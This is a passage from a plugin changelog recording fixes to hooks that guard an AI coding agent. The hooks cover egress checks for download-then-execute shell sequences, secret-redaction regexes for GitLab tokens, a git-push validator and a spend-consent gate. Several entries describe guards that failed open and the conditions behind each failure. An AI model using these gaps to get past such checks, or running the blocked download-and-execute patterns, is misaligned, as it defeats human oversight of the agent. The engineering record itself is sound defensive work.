fail on main, the fourth passes on both, which is the control. Fail-closed on a corrupt install is intended: a security guard that cannot load blocks Bash until the plugin is rebuilt, and the stderr line says how.

(count unchanged at 175, 2026-08-30, #3725 via #3815, external contribution): `skill/redact-secrets` read `tool_result || output`, two legacy aliases, and never `tool_response`, the field CC sends on PostToolUse (`types.ts`, #3418; `posttool/secret-handler.ts:60` had read `tool_response` first for exactly this reason). On every real payload the read came back empty, the hook returned silent success, and none of this layer's patterns, the #3589 GitLab family included, had ever matched production output; the unit suite stayed green because every fixture fed `tool_result`. The fix is the one-line read order `tool_response || tool_result || output`, plus two unit cases and an integration test that drives the BUILT bundle two ways (spawning `bin/run-hook.mjs` with a CC-shaped payload and asserting the `::warning::` on stderr; importing `dist/skill.mjs` in-process) and skips itself when the bundle is absent. Verified at review by running that integration test against main's bundle: 2 of 3 fail, so the test measures the fix and not the mock; on the PR head 70/70 and typecheck clean. The contributor also found, and kept out of scope, that `run-hook.mjs` imports its dist bundle by bare absolute path, which throws `ERR_UNSUPPORTED_ESM_URL_SCHEME` on win32 and is swallowed into silent success, so through the dispatcher every hook no-ops on Windows; tracked as #3817. This entry and the Lab playground are the maintainer's paperwork for a fork PR (the playground gate exempts fork PRs by design).

(count unchanged at 175, 2026-08-30, #3806): the "CLAUDE_ENV_FILE Pattern" section claimed exports from a SessionStart/ConfigChange hook reach "all future hook invocations in the session". Measured on CC 2.1.251 (the #3322 build first designed its sandbox-posture publisher on that claim): the export reaches the Bash tool's environment and no later hook, sync or async, plugin or `--settings`, dispatcher sub-hook or top-level. Consumer audit, decided per consumer as the issue asked: `config-change/settings-reload` was the only writer, and it already wrote a flag file alongside the export, which `lib/env.ts` `getLogLevel()` already read as its step 4; so `/debug` propagation was never broken, but its comments called the dead channel "primary" and the live one a "fallback", inverted. `session-env-setup` writes JSON state files, not exports; `cache-break-detector`'s header said its shape hash was "persisted via CLAUDE_ENV_FILE" while the code has always used a turn-state file; every other `ORK_*` variable hooks read is operator-set. No code path changed: the env-file append is kept because a shell command Claude runs does see `$ORK_DEBUG`, which is a real reader. The README section, the `When to Use` table, the example and the constraints now state the measured scope, with the observer table as the repro; the three comments say which reader each channel serves. Whether the hook-side blindness is a CC defect or the feature's intended scope is unsettled upstream and is not claimed either way here.

(count unchanged at 175, 2026-08-30, #3804): `skill/cross-instance-test-validator` became a real Stop-time check. It was registered on `Stop` (async, `asyncRewake`) but read `tool_input.file_path` and `tool_input.content`, fields a Stop payload never carries, so it returned silent success on every invocation and its block path had never executed in production; the verdict probe measured `trip=silent` and carried it as the suite's one `xfail`. The unit suite was green throughout because it built the PostToolUse payload the registered event does not deliver (the #3801 / #959 class). The set of files to validate now comes from `.claude/state/edit-history.jsonl`, which `posttool/write/edit-history-tracker` already appends on every Write/Edit/MultiEdit with the writing session's `sid`, so the read is scoped to the stopping session (#2919) and each file's content is read from disk at Stop time. Findings are remembered per session in `.claude/state/test-coverage-reported-<sid>.json` so a file the operator chose to leave untested blocks once, not on every later turn; `stop_hook_active` short-circuits so a block cannot re-enter (the CC 2.1.78 loop shape); a file with no exports, a deleted file, a test file and a non-code file are skipped. Test discovery gained the MIRRORED layout (`src/__tests__/skill/x.test.ts` for `src/skill/x.ts`, walking ancestors up to the project root for `__tests__/`, `tests/` and `test/`, plus the Python `tests/` equivalents): without it the hook would have blocked every ork hook author at Stop, since this repo mirrors its tests rather than placing them beside the source. Warnings for a present-but-incomplete test file use `systemMessage` (a Stop-legal key) instead of `outputWithContext`, whose hardcoded `hookEventName: PostToolUse` the output guard strips on Stop (#1794). The single-file payload shape is still honoured when present, so a PostToolUse dispatch would work without another rewrite. The probe's `xfail` marker is removed; its trip seeds `edit-history.jsonl` with the runner's session id and asserts `block`, and its control adds `src/svc.test.ts` and asserts `silent`. The unit suite was rewritten on the real filesystem (temp project dir, seeded history, Stop payload), with cases for the re-entry guard, the once-per-session marker, cross-session isolation, the mirrored tree, relative history paths, and the legacy dispatch.

(count unchanged at 175, 2026-08-30, #3322 sandbox posture): `pretool/bash/network-egress-guard` stands its ASK tier down when CC's own Bash sandbox is on with a network policy (`lib/sandbox-posture.ts` resolves `sandbox.enabled` and `sandbox.network.{allowedDomains,deniedDomains,strictAllowlist}` across the four settings scopes in CC precedence); the DENY tier is unchanged and unknown posture keeps the full guard. The retirement gate in the guard's header was met by observation, not by reading: a `claude -p` run with `sandbox.enabled: true` and an allowlist of github.com had `curl https://example.com` answered `CONNECT tunnel failed, response 403` with a `<sandbox_violations> deny network-outbound example.com:443` block; the same command with the sandbox off reached the host. The first design published the posture at SessionStart through CLAUDE_ENV_FILE and was measured dead (#3806: exports reach the Bash tool env, never a later hook), so the guard reads the settings files itself (four existsSync calls, sub-millisecond). The existing egress suite pins `ORK_SANDBOX_ENABLED=unknown` so it tests the tiers, not the machine it runs on.

(count unchanged at 175, 2026-08-29, verdict probes): `bin/run-hook.mjs` records a `verdict` field on every hook-timing line (deny/ask/allow/defer/block/context/silent/error), and `tests/hooks/verdict-probes/` drives 17 decisive hooks through the real runner with trip and control fixtures, asserting the verdict. Day-one findings, both fixed here: `pretool/write-edit/sync-write-edit-dispatcher` merged only additionalContext and updatedInput, so a sibling's `ask` (file-guard, context-file-budget-guard) was discarded and both guards had been inert in production since #2947; `pretool/bash/git-validator` returned early on a non-protected session branch, so `git push origin HEAD:main` from a feature branch was allowed. One tracked as known-dead: `skill/cross-instance-test-validator` on Stop reads a tool_input a Stop payload never carries (#3804). See "Verdict probes" above.

(count unchanged at 175, 2026-08-29): `asyncRewake` on the three async hooks that compute a block verdict (`posttool/write/stale-import-detector`, `skill/coverage-threshold-gate`, `skill/cross-instance-test-validator`), plus a `--rewake` flag on `bin/run-hook.mjs` that maps `continue: false` to exit 2 with the reason on stderr. Before, an async block was inert by CC design and its JSON waited for a next turn; now CC wakes Claude with the finding the moment the verifier finishes. Mechanism measured on 2.1.251 and 2.1.248 through a scripted loopback Messages API (nonce delivered in the next request under asyncRewake, never under plain async); the field's support cannot be read from `plugin validate`, which also passes a bogus field name. See "asyncRewake: a background verdict that interrupts" under Async Hooks.

(count 171 -> 175, 2026-08-29): `PreModelSwitch` and `PostModelSwitch` adopted (#3789, CC 2.1.251). The standing rule "no Fable spend without consent" had one door guarded, `pretool/task/fable-spend-consent` on an agent SPAWN pin, and none on the other door, the session itself moving onto the premium tier via `/model`, the picker or the SDK's set_model. 2.1.251 added a hook at exactly that seam. `lifecycle/model-switch-consent` (PreModelSwitch, sync, 10s) answers `permissionDecision: ask` when `to_model` is Fable or Mythos and the session is not already on that tier, quoting CC's own `estimated_cache_write_usd` when non-zero; within-tier moves and `ORK_FABLE_OK=1` pass silently, and like the spawn gate it is deliberately NOT skipped under bypass mode (spend consent is not a permission). `lifecycle/model-switch-telemetry` (PostModelSwitch, async) appends one line per switch to `~/.claude/analytics/model-switch.jsonl` and never writes stdout context (exit-0 stdout on that event is shown to Claude). Both events also get the webhook forwarder, hence +4. The payload contract was MEASURED, not read from docs, which still do not list the events: a stdin-dumping hook on a real 2.1.251 `-p` session running `/model claude-opus-5` captured `from_model, to_model, requested_model, source ("command"), context_tokens, prompt_cache_warm, cache_ttl, estimated_cache_write_usd, pricing`, and the binary's hook registry describes output as "JSON permissionDecision allow/deny/ask as for PreToolUse; exit 2 blocks" with matcher on `to_model`. The same release put staleness on SessionStart resume payloads; measured fields are `seconds_since_last_response, context_tokens, prompt_cache_likely_expired, estimated_cache_write_usd, session_title` (NOT the `staleness_ms` the binary's string table suggests; that key is the device bridge's). `lib/session-staleness.ts` owns all readers; `sync-session-dispatcher` now records the resume fields in `session-start-perf.jsonl`, and `session-handoff-injector` skips a resume that came back within 30 minutes onto a cache CC reports warm (conversation intact, nothing to re-orient), still injecting on cold or long-idle resumes. Types, the three event allowlists (`tests/hooks/test-hook-structure.sh`, `tests/schemas/test-plugin-schema.sh`, `spec/cc-output-keys.spec.yml`) and `permissionDecision`'s event set were extended for the new event names, which they rejected before. One of those allowlists is load-bearing at runtime, and the end-to-end run is what proved it: with `PreModelSwitch` absent from `EVENTS_WITH_HOOK_EVENT_NAME` in `bin/cc-output-keys.generated.mjs`, `output-guard.mjs` stripped the hook's `hookEventName`, CC reported `Hook JSON output validation failed — hookSpecificOutput is missing required field`, and the switch to Fable PROCEEDED, i.e. the consent gate failed open while every unit test was green (58/58). Adding the event to the generated module (and to `KEY_EVENTS` for `permissionDecision`/`permissionDecisionReason`) turned the same `claude -p "/model claude-fable-5"` run into `Model switch to Fable 5 was blocked by a PreModelSwitch hook: …`, with `ORK_FABLE_OK=1` allowing it and a non-premium switch untouched. The lesson is the #3770 class seen from the other side: a hook whose envelope the guard strips is not a hook that blocks, and only a trace-and-observe run can tell the two apart.

(count unchanged at 171, 2026-08-28, second entry): `bin/run-hook.mjs` could run a hook TWICE in one process, putting two envelopes on stdout. Three stdin handlers can start the hook; `end` (:442) and `error` (:459) both guard on `stdinClosed`, while the `data` handler's >512KB truncation branch (:421) SET that flag and never read it. So after the 100ms timeout had already run the hook against an empty payload (#3415, a slow producer losing the stdin race), a late oversized payload (#620, an image paste) ran it again, and stdout became `{"continue":true,"suppressOutput":true}` twice over: starts with `{`, fails `JSON.parse`. Measured across six stdin shapes; only the two that CONJOIN a post-timeout arrival with an over-cap payload double-emit, including the multi-chunk variant where a later chunk re-entered the branch after the threshold was already crossed. CC 2.1.248 is why this surfaced now: it changed hook stdout that looks like JSON but does not parse from silently-treated-as-plain-text into a reported hook error whose result is DISCARDED. The defect predates that release, and under the old behaviour the doubled envelope was handed downstream as plain text, which on UserPromptSubmit and SessionStart is the context channel, so it was being injected as prompt text rather than read as a result. Fix is the one-line sibling guard the other two handlers already had. The three existing tests in `run-hook-stdin-timeout.test.ts` could not have caught it on two independent counts: they call `child.stdout.resume()` and assert only on stderr and the exit code, and they exercise the two conditions separately rather than together. The new conjunction test asserts on stdout and is a verified positive control (guard removed: 1 failed / 6 passed; guard present: 7 passed), with two negative controls for the over-guarding failure mode.

(count unchanged at 171, 2026-08-28): `lifecycle/cc-version-check` had never produced an outcome other than silence, and `lifecycle/session-registrar` had never recorded a CC version. Both read `process.env.CLAUDE_CODE_VERSION`, which CC does not set in the hook environment. The corroborating measurement is the local `sessions.db`: `cc_version` is NULL in 3542 of 3542 rows, i.e. every session ever registered on this machine. `cc-version-check` returned `outputSilentSuccess()` on the unset branch, so a check that had never once run was byte-identical, to any reader, to a check that passed — the support-floor warning and the adoption nudge have therefore never fired for anyone since M130 #1487 shipped them. New `resolveRunningCC()` tries env first (kept: cheapest, and the documented contract), then a bounded 64KB scan of `transcript_path` for the `"version"` field CC stamps on user/assistant/system/attachment records (authoritative for the running session; absent on the first record, hence a scan rather than a first-line read), then the version embedded in the `claude` launcher's realpath (`.../versions/<x.y.z>`, deliberately weakest: it reports what the launcher points at NOW, and three versions are commonly installed side by side). When every source misses, the hook now says the check did NOT run instead of returning success — could-not-observe is its own outcome, which is the same rule `labs-version-probe` already applies to a failed probe. A second, stacked defect surfaced while testing the first: the adoption-nudge branch used `outputPromptContext`, which hardcodes `hookEventName: 'UserPromptSubmit'`, so the runner strips it on a SessionStart hook (`stripped additionalContext from unknown response`, #1794) and the nudge would have been discarded even once a version resolved. Both branches now use `outputSessionStartContext`, matching sibling SessionStart hook `session-registrar`. The first bug hid the second for the same reason throughout: nothing downstream of the unset env var ever executed. Verified end to end through `bin/run-hook.mjs` with the variable unset, which is production's only condition: `hookEventName: SessionStart`, and the real nudge text naming CC 2.1.250 against matrix head 2.1.241. Tests: the old `silent success when CLAUDE_CODE_VERSION is unset` case asserted the defect AND passed vacuously (it checked only `systemMessage`, a field that branch never populated either before or after), and is replaced by three cases covering the unresolvable branch, transcript resolution, and the `hookEventName`.

(count unchanged at 171, 2026-08-25): `subagent-stop/empty-result-detector` added (#3739), dispatched through `sync-subagent-stop-dispatcher` rather than as its own `hooks.json` entry, so the stamped registration count stays 171 while the entries-map handler total moves 193 to 194 (the two numbers count different things and `split-bundles.test.ts` carries that note). It flags the case where a subagent finishes with `status: completed` while emitting no final assistant text: the parent then sees a completion notification with an empty or preamble-only result, which reads as "found nothing" when it means "the delegation failed and its work is stranded" (four agents in one session, two with real work, one having committed a fix locally that was never pushed). Detection reads `agent_transcript_path` (already proven deliverable by `skill-channel-tracker` and `subagent-scope-auditor`) and classifies the tail into three verdicts, `delivered` / `empty` / `unobservable`; keeping `unobservable` distinct is the load-bearing part, because collapsing an unreadable transcript into "empty" is precisely what made `output-validator` a kill-switch (#3200) by erroring on every row. Measured base rate before shipping, across 2,735 real subagent transcripts on one machine: 2,638 delivered, 97 empty (3.5%), 0 unobservable; the empty tail is a `tool_result` 81 times, a `tool_use` 11 and a `thinking` block 5, so the dominant shape is an agent stopping the moment a tool returns, and guard denials are a minority trigger rather than the cause. The compiled classifier reproduces that split exactly against an independent Python pass over the same corpus. It deliberately never returns `continue: false`: the dispatcher short-circuits on a blocking result and would starve every hook behind it, and stop hooks re-feeding the model caused the CC 2.1.78 infinite loop, so the hook makes the failure loud via `systemMessage` and does not attempt to recover text that no longer exists.

(count unchanged at 171, 2026-08-24, third entry): GitLab token prefixes added to ork's three redaction layers (#3589, the one confirmed real finding of the CC-adoption sweep). CC 2.1.232 started redacting GitLab tokens inside its own sandbox for `glab`; ork drives `glab` from `create-pr`, `review-pr`, `fix-issue` and `chain-patterns/references/pr-from-platform.md`, yet all three of its own layers stopped at GitHub/Slack/AWS/OpenAI/Anthropic: `posttool/secret-handler/patterns.ts` (BOUNDED, in-place redaction), `skill/redact-secrets.ts` (API_KEY_PATTERNS) and `lib/crypto.ts` (`sanitizePayload`). Each now carries a `gl(pat|ptt|dt|rt|oas|agent|imt|soat|cbt|ft|ffct)-` family pattern with a 20+ char tail, and each has a test: four `gitlab-token` seeds in `fixtures/positive-seeds.ts` driven through the secret-handler positive-seed loop, a `sanitizePayload` case, and rows in the redact-secrets PAT table. The issue's keyword-matched skills (security-patterns, github-operations) were false positives and are untouched.

(count unchanged at 171, 2026-08-24, second entry): `instructions-loaded/debt-surfacer` became a reader instead of a scanner (#3708, sibling of #3705). It ran `execSync("grep -rnE …")` across 30 file extensions over the entire consuming repo on every `instructions-loaded` event, i.e. once per session start; measured at 28.2% CPU per hook process on a machine at load 107 that had kernel-panicked twice. Rate-limiting was a non-fix because there is no interval to limit: the multiplier is SESSION COUNT, and a panic reboot restarts every session at once so the scans land together on a cold machine. New `lib/debt-ledger.ts` owns a cached ledger (`getCacheDir()/debt-ledger.json`, a new `paths.ts` helper: `CLAUDE_PLUGIN_DATA/cache` else `.claude/memory/cache`) keyed on `git rev-parse HEAD`; the read path is one rev-parse plus one file read, O(1) per session. The load-bearing rule: a session-start banner is advisory, so a HEAD-old ledger is served as correct output, not treated as a miss. On a genuine miss (no ledger, or HEAD moved) exactly ONE process rebuilds it under a pidfile lock (`lib/pidlock.ts`, new, extracted from the #3705 aggregator so the two hooks share one lock implementation rather than two mirrors); contending sessions serve the stale ledger or stay silent, so the post-reboot storm collapses to a single scan. The rebuild uses `git grep -n -E -I --untracked` with extension pathspecs and `:(exclude,glob)` dirs (index-aware, skips ignored trees for free; exit 1 is an empty result, not an error) and falls back to argv-form `grep -r` outside a repository, both via `execFileSync` with no shell. `posttool/write/debt-marker-tracker` now calls `updateLedgerForFile` after each Write/Edit: it replaces that ONE file's entries (and drops the file when it carries zero markers), an O(1) producer that keeps the ledger current mid-session without a rescan; the HEAD key is deliberately untouched so an edit never masquerades as a rebuild. Tests: `debt-ledger.test.ts` (11) pins cache-hit = zero scans, HEAD-miss = exactly one scan, live-lock = stale ledger and zero scans, scan failure = stale, non-git fallback, and the per-file producer; `debt-surfacer.test.ts` was rewritten to test the renderer over a mocked ledger. `stop/security-scan-aggregator` switched to the shared pidlock with its own lock tests unchanged and green.

(count unchanged at 171, 2026-08-24): `stop/security-scan-aggregator` rewritten because the #905 "parallel + timeout" fix was inert (#3705). All five scans were synchronous, `runWithTimeout` invoked each `scanFn()` inside the Promise executor so `Promise.all` received already-settled promises and the scans ran strictly sequentially, and the 45s timers could never preempt a blocked event loop, leaving the real bound at the inner `execFileSync` timeouts (~660s worst case, the exact behavior #905 claimed to eliminate). Separately measured at 65.8s/event and ~86% of all hook time, with two concurrent instances observed, because nothing locked. The rewrite makes each control real instead of re-asserting it: scans now use async `execFile` where the 45s kill is enforced by child_process itself rather than a racing timer; a machine-wide pidfile lock (`$TMPDIR/ork-security-scan.lock`, stale-stolen after 15 min or on a dead holder pid) collapses N concurrent sessions into ONE scan; a `git status --porcelain` gate skips the scan entirely on a clean tree; `semgrep --config auto` is gone (it fetched a rule registry over the network on every Stop) and semgrep now runs only against a local config, with `--metrics=off`; the secret scan is bounded at 5,000 files and yields to the event loop per directory so the child timeouts stay enforceable, recording `files_scanned`/`truncated` in its output instead of silently walking forever. The `find | head` shell-out in the bandit gate was replaced with a depth-bounded readdir walk. New `__tests__/stop/security-scan-aggregator.test.ts` pins the three behaviors that make the rewrite real (clean-tree skip, live-lock skip with the holder's lock preserved, dead-lock steal with release after scanning) plus a dirty-tree scan producing the aggregated report; the old code had no dedicated test, which is part of how an inert fix shipped and survived.

(count unchanged at 171, 2026-08-22): `pretool/bash/network-egress-guard` false-positive fix (#3632). A quoted heredoc (`<<'SH' … SH`) writing a local script was prompting "Downloads a script from the network and then executes it", with nothing remote ever executed. Two facts compose into the bug. `normalizeSingle` replaces every newline with a space, and `STAGED_RUN_RE` is written with `[^\n]*?` spans that assume those newlines survive as boundaries; once they are gone the spans run the whole flattened command, so a `curl -o` on one heredoc body line pairs with an unrelated `bash <file>` many lines later. The hook's own quote-aware view `egressDenyScanView` knows `"` and `'` but has no heredoc case, so body bytes reached the scan verbatim. Fix applies the precedent the sibling `dangerous-command-blocker` already uses at its pipe-to-shell check (#3098): `blankQuotedHeredocBodies` runs before the quote view, because a quoted delimiter disables all shell expansion and makes the body inert payload, exactly like a single-quoted string. UNQUOTED heredocs are shell-expanded and are deliberately left untouched, so this narrows the guard rather than weakening it — the added test asserts a staged run sitting OUTSIDE any heredoc still ASKs.

(count unchanged at 171, 2026-08-17): `pretool/task/workflow-agenttype-advisor` behavior change — partial typing no longer mutes the nudge. The 2026-07-24 hook stayed silent when ANY stage set `agentType`; under that rule plus opt-in doc framing, the generic workflow-subagent bucket grew 394 → 2,612 spawns/30d (6.6×, 41% of ALL spawns; specialist share of the addressable set fell 44.2% → 25.6% vs the 2026-06-23 baseline). The advisory now counts (`N of M agent() stage(s) untyped`) and goes silent only at full coverage, and the message states the flipped default: every fan-out stage names a specialist; a generic stage carries a comment saying why. Same change flips `dynamic-workflow-patterns.md` §agentType to default-first, types `heal-loop.js`'s run stage as `ork:test-generator` (matching its repair stage), and documents `skill-fitness.js` as the deliberate-generic exception.

(count unchanged at 171, 2026-08-17): `lifecycle/stale-cache-cleanup` was registered in both `hooks.json` and `entries/lifecycle.ts`, so it fired at every SessionStart, and it had reclaimed nothing ever. Its `CACHE_DIR` was hardcoded to `.../plugins/cache/orchestkit/ork`, while every prerelease install lives under `orchestkit/ork-alpha`. `readdirSync` threw ENOENT, a bare `catch {}` swallowed it, and the hook returned success. Measured on a real machine before the fix: 15 versions, 184MB, none reclaimable. This is the #959 class inverted, a hook that is fully wired and still dead, which no registry-closure test can catch because the registration is correct; only the path is wrong. It now enumerates the channels under the marketplace root instead of assuming one. A second defect was found while fixing it: `.in_use` is **not** a boolean marker but a directory of `<pid>` files holding `{"pid":N,"procStart":"..."}`, and the old "keep the 2 newest" policy consulted it not at all. Measured: 39 entries across 15 versions, 11 live and 28 stale, with live sessions spread across two different versions. Had the path been correct, that policy would have deleted a plugin out from under a running session. The hook now keeps any version held by a live pid regardless of age, and fails **closed** (unreadable `.in_use` counts as held) because over-retaining costs disk while under-retaining breaks a live session. Covered by `tests/hooks/test-stale-cache-cleanup.sh`, which drives the shipped bundle through `run-hook.mjs` against a fixture `HOME` rather than the TS source, since a source-level test with its own fixture would have mirrored the wrong constant instead of catching it.

(216 → 171, 2026-08-14): removed the `hooks:` block from all 33 agent frontmatters (#3461, EPIC A). CC's plugin-agent loader walks a fixed key array `[permissionMode, hooks, mcpServers]` and warns-and-ignores each one it finds set — verified by byte-offset read of the 2.1.227 binary at offset 91099675, identical on 2.1.226. So every `hooks:` declaration ork shipped was inert, which is why `agent/restrict-bash` had never executed once across 193,606 hook-timing rows despite reading like a Bash allowlist. **Nothing was orphaned:** all 14 referenced implementations stay live through `pretool/bash/sync-bash-dispatcher` and the `entries/` maps, which is the real wiring; the frontmatter block was a redundant second declaration on top of it. The count drop is honest rather than a loss of behavior — 45 of the advertised 216 were declarations CC never read. `hooks` was also dropped from both `KNOWN_AGENT_FIELDS` allowlists in `scripts/eval/static-analysis.sh`, so re-adding it to a plugin agent now warns instead of passing silently.

Scope note, because this is easy to over-read: the key is inert **only for plugin agents**. Copied into a consumer's own `.claude/agents/`, `hooks:` works exactly as documented, which is what the agent-hooks skill and its eval describe. The fix was never "the feature is broken", it was "we were declaring it at the wrong level".

(count unchanged at 171, same PR): deleted six hook implementations that CI then proved were already unreachable — `pretool/bash/changelog-generator`, `ci-simulation`, `conflict-predictor`, `pre-commit-simulation`, `version-sync`, and `skill/merge-readiness-checker`, plus their six test files and their `entries/` registrations. Removing the frontmatter above did not orphan them; it **revealed** them. Each sat in the entries map with no `hooks.json` entry and no dispatcher fan-out, which is exactly the #959 class this README warns about — *"a hook in the entries map but missing from `hooks.json` is never invoked."* Their only apparent reachability was agent frontmatter, and `test-hook-registry-closure.sh` counts that as a dispatch path, so an inert source had been masking six dead hooks. The count is unchanged precisely because they were never in `hooks.json` to begin with.

All six were one batch: 73–169 lines each, advisory `additionalContext` suggestion hooks written against CC 2.1.7–2.1.9 in two April 2026 commits, untouched since. Five are superseded by machinery that demonstrably works — release-please owns the changelog, a real pre-commit hook runs on every commit, pre-push runs the security suite, `bin/validate-counts.sh` checks version consistency, and `/ork:verify` is the merge-readiness product. The sixth, `conflict-predictor`, had no live equivalent but was a four-month-cold advisory that never fired; if conflict prediction is wanted it deserves a fresh design against current CC rather than a revival of an unwired 2.1.9-era draft. Seven test functions in `tests/unit/test-git-enforcement-hooks.sh` were removed with them, including one asserting `changelog-generator` was "wired to release-engineer" — a connection the runtime never read.

Also fixed here: `bin/count-hooks.sh` could not survive a zero count. Its `grep -rch … | awk` pipeline ran under `set -euo pipefail`, so when the agent directory matched nothing grep exited 1, `pipefail` propagated it, and `set -e` killed the script before its final `echo` — leaving `TOTAL` unbound in every caller (`stamp-counts.sh` died with `TOTAL: unbound variable`). It now inspects grep's three-valued exit: 1 counts as 0, and anything ≥ 2 still fails loudly with grep's own stderr rather than silently reporting zero hooks.

(count unchanged, 2026-08-13): deleted the dead custom-pipeline mechanism (#3352), an owner-decided DELETE after two independent re-verifications. `detectPipeline()` (`lib/multi-agent-coordinator.ts:227`) was reachable code but unreachable behavior: `isAgentTeamsActive()` yields to native CC Agent Teams whenever `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` — which ork's own doctor (`skills/doctor/references/settings-posture.md`) recommends setting — so the trigger loop never ran. Telemetry across every rotated 2026-08 log: 699 checks = 699 Teams-yields = 699 no-trigger results, 0 detections; the last successful detection was 2026-01-23. Deleted `lib/multi-agent-coordinator.ts` (412 lines), `prompt/pipeline-detector.ts` (139 lines) and its test (627 lines, 23 tests), plus the three zero-caller `task-integration.ts` functions `updatePipeline`, `completePipelineStep`, and `getPipelineByType` (the last actually lived in the deleted `multi-agent-coordinator.ts`). Edited `entries/prompt.ts` (dropped the re-export and the legacy override-compat registration), `prompt/unified-dispatcher.ts` (dropped the dispatcher registration — this was the only wiring; `pipeline-detector` was never a `hooks.json` entry, so `hooks.json` and the stamped hook count are unaffected), and `subagent-stop/feedback-loop.ts` (dropped the pipeline-aware routing branch in `getDownstreamAgents`, keeping the static mapping fallback — telemetry shows it was the only branch that ever executed, since `getActivePipeline()` can never return a running pipeline while the sole `registry.pipelines` writer sits behind the same starved trigger loop). `PipelineExecution` and the `registry.pipelines` field stay, deliberately: `registerPipeline`/`getActivePipeline` in `task-integration.ts` still read/write them for `task-existence-gate`, and #3353 owns the decision on whether `registry.pipelines` itself goes away. `PipelineType`/`PipelineStep`/`PipelineDefinition` (in `orchestration-types.ts`) are now unreferenced outside their own declarations but were left in place for the same reason. Confirmed second-order defect, filed separately: `task-existence-gate` Case 3 (`pretool/task/task-existence-gate.ts:101-107`) blocks on `getActivePipeline()` being truthy, which was already structurally unreachable before this change — CLAUDE.md's "blocks them in active pipelines" claim was already false.

(count unchanged, 2026-08-12): the compaction layer stopped reading fields nobody writes, and stopped writing a field CC reads as something else (#3321 claims 2-4). FIRST, `isInImminentZone` compared the WRONG UNIT. Its input, `AccumState.estimatedTokens`, is written by exactly one hook, `posttool/context-crossing-warn`, registered under matcher `Read|Grep|Glob|WebFetch|WebSearch` — so it counts nothing from Bash, Edit, Write, agent results, MCP, or conversation turns — and it was compared against 85% of the WHOLE context window. A counter measuring a fraction of context checked against a full-context bar. Measured: 2,246 of 2,246 recorded PreCompact decisions since the gate landed returned `belowImminentZone`, 0 fired; the highest value any of 93 real state files ever held was 707,702 against an 850,000 bar. Lowering the bar would not have fixed it, because the denominator was wrong. New `lib/transcript-context.ts` reads CC's own reported usage instead: `transcript_path` is in the base payload of every hook event (the 2.1.228 shared builder returns `{session_id, transcript_path, cwd, prompt_id, permission_mode, agent_id, agent_type, effort}`), and the last main-chain assistant turn's `input_tokens + cache_creation_input_tokens + cache_read_input_tokens` IS the occupied context, same unit as the window, from the API rather than from `Math.ceil(text.length / 3.5)`. Sidechain entries are skipped because a subagent's context is not the session's, and the read is tail-anchored (256KB) because transcripts run to megabytes. No measurement returns null, never 0, and every caller treats null as "do not gate" — guessing low is precisely how the old gate became unfireable. `estimatedTokens` survives as estimator-accuracy telemetry and as the goal-trackers' recorded figure; nothing gates on it. SECOND, and shipped in the same change because the first one ARMS it: `pre-compact-task-done-prompt` took `_input` and never read `trigger`, so it would have vetoed AUTOMATIC compaction — the identical defect `pre-compact-guard` was fixed for three commits earlier, and worse here because a fixed gate turns a blocker with zero production history live. Auto now passes through as the first statement in the handler. Deliberately NOT demoted from `decision:'block'` to advisory, which the issue floated as an option: the 2.1.228 PreCompact aggregator reads `d.succeeded`, `d.blocked`, `d.output` and `d.command` and never reads a result's `systemMessage`, so an "advisory" on this event would be inert — exactly the class of dead output this issue is about. Block is the only channel PreCompact has, so the block stays and the trigger check bounds it. THIRD, `subagent-stop/unified-dispatcher` logged `is_fork` and `cache_hit_pct` from three payload fields CC does not send. #1227 took them off the 2.1.89 changelog without probing a payload. The 2.1.228 SubagentStop builder is `{...base, hook_event_name, stop_hook_active, agent_id, agent_transcript_path, agent_type, last_assistant_message, background_tasks, session_crons}` and SubagentStart is `{...base, hook_event_name, agent_id, agent_type}`; `is_fork` appears nowhere in any hook payload, its one occurrence in the binary being a field on CC's internal `tengu_agent_tool_selected` telemetry event. Measured across 11,020 real `subagent-quality.jsonl` rows: `cache_hit_pct` present in 0, `is_fork:true` in 0, `is_fork:false` in 11,020. Both columns removed rather than left reporting a constant, since a column that can only say one thing still reads as measurement. The three fields stay DECLARED in `types.ts` under a "NOT sent" note so the next reader finds the verdict instead of re-deriving it. `chain-patterns/references/fork-pattern.md` was corrected too: it documented a fork branch in the SubagentStart stager that has never existed in any hook. FOURTH, a defect found while probing the binary for the above and not named in the issue: on PreCompact, hook STDOUT is not an envelope channel. The aggregator collects `results.filter(d => d.succeeded && !d.blocked && d.output.trim())` into `newCustomInstructions`, which is passed as `customInstructions` into the compaction summary request — and for a command hook `output` is literally the process stdout when it exits 0 (`D = M ? (json.reason || stderr || "") : status===0 ? stdout : stderr`). So every ork PreCompact hook printing `{"continue":true,"suppressOutput":true}` was injecting that JSON into the prompt that writes the session summary, on every compaction; `suppressOutput` governs transcript display and does not touch this read. `emitHookResult` now suppresses stdout on PreCompact unless the result is a block, because CC reads a block from `json.reason` and excludes blocked hooks from the instruction join. The gate is by EVENT, not by hook name, because `lifecycle/webhook-forwarder` fires on both PreCompact and PostCompact and a name-based fix would have silenced the wrong one. New `__tests__/e2e/precompact-stdout-contract.test.ts` spawns the real `bin/run-hook.mjs` rather than importing a handler, because the defect lives in the emit path and no unit test on any hook's return value could ever have caught it. Why the first three survived: the tests pinned them. `pre-compact-task-done-prompt.test.ts` and `context-crossing-warn.test.ts` hand-built `AccumState` with `estimatedTokens` values the real writer could reach only for a session made entirely of file reads, then asserted the fire that only that impossible input produces — the same closed-loop fixture pattern as the `cacheReadTokens` tests deleted in #3427 and the TeammateIdle duration tests deleted in the payload-key fix. Both suites now drive the measured source; `transcript-context.test.ts` runs against real files on disk with the literal `usage` block observed in a live 2.1.228 transcript, deliberately not an fs mock, since a mock returning a hand-built shape would rebuild the same closed loop.

